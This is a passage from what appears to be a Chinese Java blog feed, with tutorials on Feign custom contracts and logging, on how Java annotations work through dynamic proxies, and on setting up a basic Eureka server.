<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloClient test = Feign.builder().client(new MyFeignClient()).target(HelloClient.class, "http://localhost:8080/");</span><br><span class="line">        System.out.println(test.sayHello());</span><br><span class="line"></span><br><span class="line">        PersonClient personClient = Feign.builder().client(new MyFeignClient()).decoder(new GsonDecoder()).target(PersonClient.class, "http://localhost:8080");</span><br><span class="line">        Person person = personClient.findById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(person.id);</span><br><span class="line">        System.out.println(person.age);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">        System.out.println(person.message);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到能正常获取结果</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign1.png" alt="运行结果"></p>
<h2 id="使用自定义的注解"><a href="#使用自定义的注解" class="headerlink" title="使用自定义的注解"></a>使用自定义的注解</h2><p>通过注解修改的接口方法，可以让接口方法获得访问服务的能力。除了Feign自带的方法外，还可以使用第三方的注解。如果向使用JAXRS贵方的注解，可以使用Feign-jaxrs模块，在Pom文件中加入以下依赖即可：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-jaxrs<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.ws.rs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsr311-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在使用注解修饰接口时，可以直接使用@GET、@Path等注解，例如想要使用GET方法调用/hello服务，可以定义以下接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GET</span> <span class="meta">@Path</span>(<span class="string">"/hello"</span>)</span><br><span class="line"><span class="function">String <span class="title">rsHello</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>以上修饰接口的，实际上等价于@RequestLine(“GET /hello”)。为了让Feign知道这些注解的作用，需要在创建服务客户端时调用contract方法来设置JAXRS注解的解析类：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">RSClient rsClient = Feign.builder().contract(new JAXRSContract()).target(RSClient.class, "http://localhost:8080/");</span><br></pre></td></tr></table></figure>

<p>设置了JAXRSContract后，Feign就知道如何处理接口中的JAXRS注解了。JAXRSContract继承了BaseContract类，BaseContract类实现了Contract接口，简单来说，一个Contract就相当于一个翻译器，Feign本身并不知道这些第三方注解的含义，而是通过实现一个翻译器（Contract）来告诉Feign，这些注解是做什么的。</p>
<p>下面实现一个自定义的注解，来解释下，是如何使用自定义注解完成必要的功能的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyUrl &#123;</span><br><span class="line">    <span class="function">String <span class="title">url</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">method</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们将HelloClient的RequestLine注解改为自定义的MyUrl注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="meta">@MyUrl</span>(method = <span class="string">"GET"</span>, url = <span class="string">"/hello"</span>)</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后实现一个自己的翻译器MyContract</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyContract</span> <span class="keyword">extends</span> <span class="title">Contract</span>.<span class="title">BaseContract</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAnnotationOnClass</span><span class="params">(MethodMetadata methodMetadata, Class&lt;?&gt; aClass)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 处理类注解的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理方法注解的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAnnotationOnMethod</span><span class="params">(MethodMetadata methodMetadata, Annotation annotation, Method method)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 是MyUrl的注解才进行处理</span></span><br><span class="line">        <span class="keyword">if</span> (annotation <span class="keyword">instanceof</span> MyUrl) &#123;</span><br><span class="line">            <span class="comment">// 获取注解的实例</span></span><br><span class="line">            MyUrl myUrlAnn = method.getAnnotation(MyUrl<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="comment">// 获取配置的HTTP方法</span></span><br><span class="line">            String httpMethod = myUrlAnn.method();</span><br><span class="line">            <span class="comment">// 获取服务的URL</span></span><br><span class="line">            String url = myUrlAnn.url();</span><br><span class="line">            <span class="comment">// 将值设置到模板中</span></span><br><span class="line">            methodMetadata.template().method(httpMethod);</span><br><span class="line">            methodMetadata.template().append(url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">processAnnotationsOnParameter</span><span class="params">(MethodMetadata methodMetadata, Annotation[] annotations, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 处理参数注解的方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，修改测试类，将调用HelloClient处插入自定义的Contract。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloClient test = Feign.builder().contract(new MyContract()).target(HelloClient.class, "http://localhost:8080/");</span><br><span class="line">        System.out.println(test.sayHello());</span><br><span class="line"></span><br><span class="line">        PersonClient personClient = Feign.builder().client(new MyFeignClient()).decoder(new GsonDecoder()).target(PersonClient.class, "http://localhost:8080");</span><br><span class="line">        Person person = personClient.findById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(person.id);</span><br><span class="line">        System.out.println(person.age);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">        System.out.println(person.message);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign2.png" alt="运行结果"></p>
<h2 id="接口日志"><a href="#接口日志" class="headerlink" title="接口日志"></a>接口日志</h2><p>默认情况下，不会记录接口的日志，如果需要很清楚地了解接口的调用情况，可以使用logLevel方法进行配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.kingwang.feign.client;</span><br><span class="line"></span><br><span class="line">import feign.Feign;</span><br><span class="line">import feign.Logger;</span><br><span class="line">import feign.gson.GsonDecoder;</span><br><span class="line"></span><br><span class="line">public class TestClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        HelloClient test &#x3D; Feign.builder().contract(new MyContract()).logLevel(Logger.Level.HEADERS).logger(new Logger.JavaLogger().appendToFile(&quot;D:&#x2F;log.log&quot;)).target(HelloClient.class, &quot;http:&#x2F;&#x2F;localhost:8080&#x2F;&quot;);</span><br><span class="line">        System.out.println(test.sayHello());</span><br><span class="line"></span><br><span class="line">        PersonClient personClient &#x3D; Feign.builder().client(new MyFeignClient()).decoder(new GsonDecoder()).target(PersonClient.class, &quot;http:&#x2F;&#x2F;localhost:8080&quot;);</span><br><span class="line">        Person person &#x3D; personClient.findById(1);</span><br><span class="line">        System.out.println(person.id);</span><br><span class="line">        System.out.println(person.age);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">        System.out.println(person.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置日志级别为Level.HEADERS，并将其输出到D盘的log.log文件。</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign3.png" alt="运行结果"></p>
<p>设置接口的日志级别，有以下可选值：</p>
<ul>
<li>NONE：默认值，不进行日志记录</li>
<li>BASIC：记录请求方法、URL、响应状态代码和执行时间</li>
<li>HEADERS：除了BASIC记录的信息外，还包括请求头和响应头</li>
<li>FULL：记录全部日志，包括请求头、请求体、请求与响应的元数据</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href>疯狂Spring Cloud微服务架构实战</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring</tag>
        <tag>Feign</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的注解</title>
    <url>/2020/04/24/Java/Java%E5%9F%BA%E7%A1%80/2020-04-24-Java%E4%B8%AD%E7%9A%84%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="Java中的注解"><a href="#Java中的注解" class="headerlink" title="Java中的注解"></a>Java中的注解</h1><h2 id="什么是注解"><a href="#什么是注解" class="headerlink" title="什么是注解"></a>什么是注解</h2><p>注解也叫<strong>元数据</strong>，例如我们常见的<code>@Override</code>和<code>@Deprecated</code>，注解是JDK1.5版本开始引入的一个特性，用于对代码进行说明，可以对包、类、接口、字段、方法参数、局部变量等进行注解。</p>
<p>它主要的作用有以下四方面：</p>
<ul>
<li>生成文档，通过代码里标识的元数据生成javadoc文档。</li>
<li>编译检查，通过代码里标识的元数据让编译器在编译期间进行检查验证。</li>
<li>编译时动态处理，编译时通过代码里标识的元数据动态处理，例如动态生成代码。</li>
<li>运行时动态处理，运行时通过代码里标识的元数据动态处理，例如使用反射注入实例。</li>
</ul>
<h2 id="注解的分类"><a href="#注解的分类" class="headerlink" title="注解的分类"></a>注解的分类</h2><p>注解一般可以分为三类：</p>
<ol>
<li>元注解：元注解是用于定义注解的注解，包括@Retention、@Target、@Inherited、@Documented，@Retention用于标明注解被保留的阶段，@Target用于标明注解使用的范围，@Inherited用于标明注解可继承，@Documented用于标明是否生成javadoc文档。</li>
<li>JDK自带的标准注解：包括@Override、@Deprecated和@SuppressWarnings，分别用于标明重写某个方法、标明某个类或方法过时、标明要忽略的警告，用这些注解标明后编译器就会进行检查。</li>
<li>自定义注解：根据自己的需求定义注解，并可用元注解对自定义注解进行注解</li>
</ol>
<h2 id="注解的声明"><a href="#注解的声明" class="headerlink" title="注解的声明"></a>注解的声明</h2><p>可以按照如下形式声明一个自定义的注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.FIELD)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> CustomAnnotation &#123;</span><br><span class="line">	<span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用@interface语法，声明一个CustomAnnotation，然后使用元注解@Target(ElementType.FIELD)限定该注解只能用于属性值上，注解@Rentention(RetentionPolicy.RUNNTIME)限定，该注解的生存期是运行时。</p>
<p><code>@Target</code>还有其他几种取值，分别是：</p>
<ul>
<li><strong>TYPE</strong>：标明该注解可以用于类、接口（包括注解类型）或enum声明</li>
<li><strong>FIELD</strong>：标明该注解可以用于字段（域）声明，包括enum示例</li>
<li><strong>METHOD</strong>：标明该注解可以用于方法声明</li>
<li><strong>PARAMETER</strong>：标明该注解可以用于参数声明</li>
<li><strong>CONSTRUCTOR</strong>：标明该注解可以用于构造函数声明</li>
<li><strong>LOCAL_VARIABLE</strong>：标明该注解可以用于局部变量声明</li>
<li><strong>ANNOTATION_TYPE</strong>：标明该注解可以用于局部变量声明</li>
<li><strong>PACKAGE</strong>：标明该注解可以用于包声明</li>
<li><strong>TYPE_PARAMETER</strong>：标明该注解可以用于类型参数声明</li>
<li><strong>TYPE_USE</strong>：标明该注解可以用于类型使用声明</li>
</ul>
<p><strong>注意</strong>：当注解未指定Target值时，该注解可以用于任何元素值上，多个值可以使用花括号包围，以逗号分隔。</p>
<p><code>@Target(value={CONSTRUCTOR,FIELD,...,METHOD})</code></p>
<p>@Retetion用来约束注解的声明周期，可以有3个取值：source（源码级别）、class（类文件级别）和runtime（运行时级别）。如果注解未定义Rentetion的时候，默认级别是CLASS。</p>
<ul>
<li>SOURCE：注解将会被编译器丢弃。此类型的注解信息只会保留在源码里，源码经过编译后，注解的信息会被丢弃，不会保留在编译好的class文件里。</li>
<li>CLASS：注解在class文件中可用，但会在JVM丢弃。此类型的注解信息会保留在源码里和class文件里，在执行的时候不会加载到虚拟机中。</li>
<li>RUNTIME：注解细腻系将在运行期（JVM）也保留，因此可以通过反射机制读取注解的信息（源码、class文件和执行的时候都有注解的信息）。</li>
</ul>
<h2 id="注解的原理"><a href="#注解的原理" class="headerlink" title="注解的原理"></a>注解的原理</h2><p>下面我们用这两段程序看看注解的实现原理</p>
<p>CustomAnnotation注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(value = &#123;ElementType.FIELD, ElementType.METHOD&#125;)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> CustomAnnotation &#123;</span><br><span class="line">	<span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> "CustomAnnotation"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@CustomAnnotation</span>(value = <span class="string">"test"</span>)</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> String value = <span class="string">""</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@CustomAnnotation</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> String defaultValue;</span><br><span class="line">	<span class="meta">@CustomAnnotation</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">		System.setProperty(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="string">"true"</span>);</span><br><span class="line">		Class cls = AnnotationTest<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">		Method method = cls.getMethod(<span class="string">"main"</span>, String[]<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		CustomAnnotation annotation = method.getAnnotation(CustomAnnotation<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>语句<code>System.setProperty(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);</code>的目的是为了将运行过程中的中间类保存到磁盘上，供分析。</p>
<p>首先，在main方法处打个断点，看看</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-annotation.png" alt></p>
<p>可以发现annotation其实是一个代理对象。</p>
<p>接着，在看看运行main方法之后生成的中间文件</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-annotation1.png" alt></p>
<p>可以看到它生成了两个中间文件，<code>$Proxy0</code>和<code>$Proxy1</code></p>
<p>因为CustomAnnotation是$Proxy1对象，我们反编译一下看看。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> CustomAnnotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> $<span class="title">Proxy1</span> <span class="keyword">extends</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">CustomAnnotation</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m4;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> $Proxy1(InvocationHandler paramInvocationHandler) &#123;</span><br><span class="line">    <span class="keyword">super</span>(paramInvocationHandler);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object paramObject)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ((Boolean)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m1, <span class="keyword">new</span> Object[] &#123; paramObject &#125;)).booleanValue();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error|RuntimeException error) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (String)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m2, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error|RuntimeException error) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Class <span class="title">annotationType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (Class)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m4, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error|RuntimeException error) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ((Integer)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m0, <span class="keyword">null</span>)).intValue();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error|RuntimeException error) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (String)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m3, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error|RuntimeException error) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      m1 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"equals"</span>, <span class="keyword">new</span> Class[] &#123; Class.forName(<span class="string">"java.lang.Object"</span>) &#125;);</span><br><span class="line">      m2 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"toString"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">      m4 = Class.forName(<span class="string">"CustomAnnotation"</span>).getMethod(<span class="string">"annotationType"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">      m0 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"hashCode"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">      m3 = Class.forName(<span class="string">"CustomAnnotation"</span>).getMethod(<span class="string">"value"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException noSuchMethodException) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodError(noSuchMethodException.getMessage());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException classNotFoundException) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> NoClassDefFoundError(classNotFoundException.getMessage());</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码中得知，$Proxy1类实现了CustomAnnotation接口，说明它就是CustomAnnotation的动态代理类。</p>
<p>然后我们再反编译下CustomAnnotation的字节码</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-annotation2.png" alt="反编译CustomAnnotation"></p>
<p>可以看到第二个红框，有一个ACC_ANNOTATION的标记，标明这是一个注解。而第一个红框，表示接口CustomAnnotation扩展了接口Annotation。所以，<strong>注解的本质就是一个继承了接口Annotation的接口</strong>。</p>
<p>而Annotation接口声明了以下的方法：</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-annotation3.png" alt="Annotation接口的方法"></p>
<p>这些方法，正是动态代理类$Proxy1实现的方法。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>注解</tag>
        <tag>反射</tag>
        <tag>动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建一个简单的Eureka应用</title>
    <url>/2020/04/23/SpringCloud/2020-04-23-006-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84Eureka%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h1 id="搭建一个简单的Eureka应用"><a href="#搭建一个简单的Eureka应用" class="headerlink" title="搭建一个简单的Eureka应用"></a>搭建一个简单的Eureka应用</h1><p>Eureka提供基于REST的服务，在集群中主要用于服务管理。Eureka提供了基于Java语言的客户端组件，客户端组件实现了负载均很的功能，为业务组件的集群部署创建了条件。使用该框架，可以将业务组件注册到Eureka容器中，这些组件可进行集群部署，Eureka主要维护这些服务的列表并自动检查他们的状态。</p>
<h2 id="简单的Eureka集群应用"><a href="#简单的Eureka集群应用" class="headerlink" title="简单的Eureka集群应用"></a>简单的Eureka集群应用</h2><p>一个简单的Eureka应用，需要包括一个Eureka服务器和若干个服务提供者。我们可以将业务组件注册到Eureka服务器中，其他客户端组件可以向服务器获取服务器并且进行远程调用。</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka1.png" alt="简单的Eureka应用架构"></p>
<p>接下来，搭建一个简单的Eureka应用。</p>
<h2 id="搭建服务器"><a href="#搭建服务器" class="headerlink" title="搭建服务器"></a>搭建服务器</h2><p>新建一个first-ek-server的maven，在pom文件中加入如下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">version</span>&gt;</span>Dalston.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>加入的spring-cloud-started-eureka-server会自动引入spring-boot-start-web。</p>
<p>接下来，写一个启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arsg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> SpringApplicationBuilder(FirstServer<span class="class">.<span class="keyword">class</span>).<span class="title">run</span>(<span class="title">arsg</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

